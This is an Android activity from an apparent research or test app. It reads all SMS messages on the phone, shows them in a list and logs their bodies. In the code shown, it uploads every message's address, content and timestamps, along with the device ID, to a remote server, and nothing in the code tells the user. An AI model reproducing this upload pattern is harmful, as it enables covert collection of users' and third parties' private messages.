package com.federation.funf_test;

import android.Manifest;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.federation.funf_test.gonogo.GoNogoResultActivity;

import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.Timestamp;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;

import static android.content.ContentValues.TAG;

public class SmsLogActivity extends Activity {

    ListView smsLogListView;
    ArrayList params = new ArrayList();

    JSONParser jsonParser = new JSONParser();
    private ProgressDialog pDialog;
    private static String url_create = "https://pos.pentacle.tech/api/message/create";
    private static final String TAG_SUCCESS = "success";
    List<Sms> smsList;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.sms_log_view);
        smsLogListView = (ListView) findViewById(R.id.sms_log_listview_id);

        ActivityCompat.requestPermissions(SmsLogActivity.this,
                new String[]{Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS},
                1);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1: {

                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    showCallLog();

                    // permission was granted, yay! Do the
                    // contacts-related task you need to do.
                } else {

                    // permission denied, boo! Disable the
                    // functionality that depends on this permission.
                    Toast.makeText(SmsLogActivity.this, "Permission denied to read your External storage", Toast.LENGTH_SHORT).show();
                }
                return;
            }
            // other 'case' lines to check for other
            // permissions this app might request
        }
    }

    void showCallLog() {
        ArrayList<String> callArrayList= new ArrayList<>();
        ArrayList<JSONObject> smsArrayList= new ArrayList<>();

        TelephonyProvider telephonyProvider = new TelephonyProvider(this);
        smsList = telephonyProvider.getSms(TelephonyProvider.Filter.ALL).getList();

        String androidId = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID);

        for (Sms i : smsList) {
            JSONObject newSMS = new JSONObject();

            try {
                newSMS.put("device_id", androidId);
                newSMS.put("address", i.address);
                newSMS.put("content", i.body);
                newSMS.put("seen_status", i.seen);
                newSMS.put("read_status", i.read);
                newSMS.put("sent_at", i.sentDate);
                newSMS.put("received_at", i.receivedDate);

                smsArrayList.add(newSMS);
            } catch (JSONException e) {
                e.printStackTrace();
            }

            callArrayList.add("Subject:" + i.subject + "\nBody: " + i.body + "\nAddress: " + i.address + "\n Received Date: " + i.receivedDate + "\nPerson: " + i.person + "\nSent Date: " + i.sentDate  + "\nSeen: " + i.seen + "\nRead: " + i.read + "\nStatus: " + i.status);
            Log.d(TAG, "showCallLog: " + i.body);
        }
        callArrayList.add("Test 1");

        ArrayAdapter arrayAdapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, callArrayList);

        smsLogListView.setAdapter(arrayAdapter);

        Log.d("Debug", smsList.toString());

        params.add(new BasicNameValuePair("device_id", androidId));
        params.add(new BasicNameValuePair("sms_list", smsArrayList.toString()));
        new CreateNewResult().execute();
    }

    class CreateNewResult extends AsyncTask<String, String, JSONObject> {
        /**
         * Before starting background thread Show Progress Dialog
         */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();

        }

        /**
         * Creating product
         */
        protected JSONObject doInBackground(String... args) {
            // getting JSON Object
            // Note that create product url accepts POST methodN
            JSONObject json = jsonParser.makeHttpRequest(url_create,
                    "POST", params);
            // check log cat fro response
            //Log.d("Debug", json.toString());

            return json;
        }

        /**
         * After completing background task Dismiss the progress dialog
         **/
        protected void onPostExecute(JSONObject file_url) {
            // dismiss the dialog once done
        }
    }
}
